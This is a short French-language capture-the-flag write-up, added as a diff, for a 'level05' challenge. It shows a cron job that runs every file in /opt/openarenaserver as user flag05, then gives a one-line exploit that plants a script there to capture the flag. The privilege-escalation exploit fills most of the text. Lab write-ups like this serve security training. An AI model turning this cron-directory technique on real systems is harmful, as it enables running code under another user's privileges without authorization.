@@ -1,0 +1,21 @@
+dans /var/mail/level05
+
+on trouve: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+ce qui signifie qu'un job cron troune sur flag05 qui lance /usr/sbin/openarenaserver
+
+/usr/sbin/openarenaserver: 
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+on creer un file dans /opt/openarenaserver/ avec la ligne
+
+echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag
+
+au bout de 3 min le flag et ecrie dans le terminal
